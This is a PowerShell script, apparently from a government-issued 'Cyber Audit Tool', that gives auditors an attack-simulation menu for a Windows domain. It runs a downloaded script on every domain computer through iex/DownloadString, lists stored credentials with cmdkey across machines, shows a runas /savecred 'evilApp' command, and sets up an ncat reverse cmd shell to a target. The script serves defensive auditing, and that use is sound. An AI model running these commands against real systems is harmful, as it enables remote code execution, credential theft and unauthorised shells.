<#	
	.NOTES
	===========================================================================
	 Created on:   	2/24/2020 1:11 PM
	 Created by:   	Omerf
	 Organization: 	Israel Cyber Directorate
	 Filename:     	CyberAttack
	===========================================================================
	.DESCRIPTION
		Cyber Audit Tool - Attack
#>

. $PSScriptRoot\CyberFunctions.ps1
ShowIncd
CyberBginfo
$Host.UI.RawUI.WindowTitle = "Cyber Audit Tool 2020 - Attack"

#Set the credentials for this Audit (it will be stored in a file)
#Get-Credential $env:userdomain\$env:USERNAME | Export-Clixml -Path $PSScriptRoot\Tools\credentials.xml
#$cred = Import-Clixml -Path $PSScriptRoot\Tools\credentials.xml

start-Transcript -path $AcqBaseFolder\CyberAttackPhase.Log -Force -append

cls

do {
#Create the main menu
Write-Host ""
Write-Host "************************************************************************               " -ForegroundColor White
Write-Host "*** Cyber Audit Tool (Powershell Edition) - ISRAEL CYBER DIRECTORATE ***               " -ForegroundColor White
Write-Host "************************************************************************               " -ForegroundColor White
Write-Host ""
Write-Host "     Attacking Tools and Scripts:                                                      " -ForegroundColor White
Write-Host ""
Write-Host "     1. InfectionMonkey		| Breach and Attack Simulation tool                        " -ForegroundColor White
Write-Host "     2. Vulmap(online)		| Find Windows/Linux installed software vulnerabilities    " -ForegroundColor White
Write-Host "     3. cmdkey      		| Searching for usable domain admin stored credentials     " -ForegroundColor White
Write-Host "     4. ncat         		| Hacking using ncat (netcat replacement)                  " -ForegroundColor White
Write-Host "     5. NirSoft     		| Password recovery, networking, system and forensics      " -ForegroundColor White
Write-Host ""
Write-Host "    99. Quit                                                                           " -ForegroundColor White
Write-Host ""
$input=Read-Host "Select Script Number"

switch ($input) 
     { 
     
     #InfectionMonkey
     1 {
        Cls
        $ACQ = ACQ("InfectionMonkey")
        $help = @"

    Infection Monkey is an open source security tool for testing a data centers resiliency to perimeter breaches and internal server infection.
    The Monkey uses various methods to self propagate across a data center and reports success to a centralized Monkey Island server.

    The Infection Monkey is comprised of two parts:
    1. Monkey - A tool which infects other machines and propagates to them.
    2. Monkey Island - A dedicated server to control and visualize the Infection Monkeys progress inside the data center.

    The Infection Monkey uses the following techniques and exploits to propagate to other machines:
        
    1. Multiple propagation techniques:
       - Predefined passwords
       - Common logical exploits
       - Password stealing using Mimikatz
        
    2. Multiple exploit methods:
       - SSH
       - SMB
       - WMI
       - Shellshock
       - Conficker
       - SambaCry
       - Elastic Search (CVE-2015-1427)

     Getting started links: 
       - Windows: https://www.guardicore.com/infectionmonkey/wt/win.html
       - Securing Remote Workers: https://www.guardicore.com/infectionmonkey/wfh.html

     Other Platforms:
     - AWS
     - Azure
     - VMware 
     - Docker 
     - Debian

"@
        write-host "Checking if InfectionMonkey is installed, if not we will start the installation"
        $isInstalled = Get-WmiObject -Class Win32_Product | Where-Object {$_.Name -like '*monkey*'}
        if ($isInstalled)
        {
            $a = "C:\Program Files\Guardicore\Monkey Island\monkey_island"
            Push-Location $a
            Start-Process -FilePath ".\MonkeyIsland.exe"
            Pop-Location
        }
        else
        {
            $a = appDir("infectionmonkey")
            Push-Location $a
            Start-Process -FilePath ".\MonkeyIslandSetup.exe"
            Pop-Location
        }
        
        Write-Host "Web interface: https://localhost:5000/" -ForegroundColor Yellow
        read-host “Press ENTER to continue”
      }

    #Vulmap
    2 {
       $help = @"

        Vulmap
        ------
        
        Online local vulnerability scanner for installed software,
        and then search for any existing exploites to the software in http://vulmon.com API.
       
        The script will run on all machines found in the Active Directory of the domain.
              
        All found exploits can be downloaded by Vulmap using this command:
        Invoke-Vulmap -DownloadAllExploits

"@
        Write-Host $help

        if (!(Test-NetConnection google.com).pingsucceeded)
        {
            failed "You need to be connected to the internet in order to run this test"
        }
        else
        {
            $ACQ = ACQ("Vulmap")
            $ADcomputers = Get-ADComputer -Filter * | Select-Object name
            foreach ($comp in $ADcomputers)
            {
                if (Test-Connection -ComputerName $comp.name -Count 1 -TimeToLive 20 -ErrorAction Continue)
                {
                    $compname = $comp.name
                    success $compname
                    $res = Invoke-command -COMPUTER $comp.Name -ScriptBlock {iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/vulmon/Vulmap/master/Vulmap-Windows/vulmap-windows.ps1')} -ErrorAction SilentlyContinue -ErrorVariable ResolutionError | out-string -Width 4096 
                    Out-File -InputObject ($res) -FilePath "$ACQ\$compname.txt" -Encoding ascii
                }
            }
        }
        read-host “Press ENTER to continue”
        $null = start-Process -PassThru explorer $ACQ
        }

    #cmdkey
    3 {
       $help = @"

        cmdkey
        ------
        
        Cmdkey is a pre-installed Windows tool, It’s essentially a credential manager,
        and these credentials are stored by default in:
        C:\users\username\AppData\Roaming\Microsoft\Credentials\
       
       Cmdkey can store two types of password. The first is a generic password which can be used anywhere,
       and the second a domain password which can be used to access a domain server.

       Stored credentials can be leveraged to type the contents of files and run executables with the same 
       privileges as the credentials stored.

       The script will collect information from all machines found in the Active Directory of the domain.

       Howto utilize the attack:
       runas /savecred /user:Domain\Administrator "\\<Computer>\<share>\<evilApp.exe>

"@
        Write-Host $help
        $ACQ = ACQ("cmdkey")
        $ADcomputers = Get-ADComputer -Filter * | Select-Object name
        foreach ($comp in $ADcomputers)
        {
            if ((Test-NetConnection -ComputerName dc1-test).PingSucceeded)
            {
                $compname = $comp.name
                success $compname
                $res = Invoke-command -COMPUTER $comp.Name -ScriptBlock {start cmdkey /list} -ErrorAction SilentlyContinue -ErrorVariable ResolutionError
                Out-File -InputObject ($res) -FilePath "$ACQ\$compname-cmdkeys.txt" -Encoding ascii
            }
        }
        read-host “Press ENTER to continue”
        $null = start-Process -PassThru explorer $ACQ
        }
      #Ncat
    4 {
       $ncatPath = scoop prefix ncat
       $help = @"

        Ncat (netcat)
        -------------
        
        https://nmap.org/ncat/

        networking utility which reads and writes data across networks from the command line,
        and is integrated with Nmap.

        This script will help you to open an Encrypted reverse cmd shell from a remote computer
        to the local computer.
        
        Tutorials
        ---------
        https://www.hackingtutorials.org/networking/hacking-with-netcat-part-1-the-basics/

        Note: You can copy ncat from: $ncat
"@
        Write-Host $help
        $ACQ = ACQ("ncat")
        $input = Read-Host "Input the destination computer name or IP address to copy ncat to (eg. DC1 or 10.1.1.22)"
        $targetIP = ((Test-Connection $input -Count 1).IPV4Address).IPAddressToString
        $localIP = activeIPaddress
        $ncatPath
        $input
        Copy-Item -Path "$ncatPath\ncat.exe" -Destination "\\$targetIP\c$\Temp"
        Write-Host "Starting ncat on local machine port 9999"
        Start-Process PowerShell -ArgumentList "ncat -vnl 9999 --allow $targetIP --ssl;read-host 'Press Enter to Exit'" -Verb RunAs
        Write-Host "Run this command on target [$input]: c:\temp\ncat.exe --exec cmd.exe -vn $localIP 9999 --ssl" 
        read-host “Press ENTER to exit”
        #$null = start-Process -PassThru explorer $ACQ
        }
       #KerberosRun
    5 {
       $KerberosRun = scoop prefix KerberosRun
       $help = @"

        Nirsoft Utilities
        -----------------
        
        NirLauncher is a package of more than 200 portable freeware utilities:
        - Password Recovery Utilities
        - Network Monitoring Tools
        - Web Browser Tools
        - Video/Audio Related Utilities
        - Internet Related Utilities
        - Desktop Utilities
        - Outlook/Office Utilities
        - Programmer Tools
        - Disk Utilities
        - System Utilities
        - Forensic Utilities

"@
        Write-Host $help
        $ACQ = ACQ("ncat")

        #$null = start-Process -PassThru explorer $ACQ
        }

    #Menu End
    }
 cls
 }
while ($input -ne '99')
stop-Transcript | out-null